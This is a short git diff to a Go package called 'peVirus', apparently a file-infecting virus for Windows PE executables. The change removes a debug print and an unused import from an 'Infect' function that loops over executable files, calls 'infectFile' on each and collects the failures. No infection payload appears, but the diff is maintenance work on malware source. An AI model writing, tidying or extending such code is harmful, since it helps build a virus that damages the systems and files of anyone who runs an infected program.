@@ -3,7 +3,6 @@ package peVirus
 import (
 	"bytes"
 	"encoding/binary"
-	"fmt"
 	"os"
 )
 
@@ -306,7 +305,6 @@ func infectFile(filename string) bool {
 }
 
 func Infect(peFile []string) (x64file []string) {
-	fmt.Println(peFile)
 	for _, _file := range peFile {
 		if !infectFile(_file) {
 			x64file = append(x64file, _file)
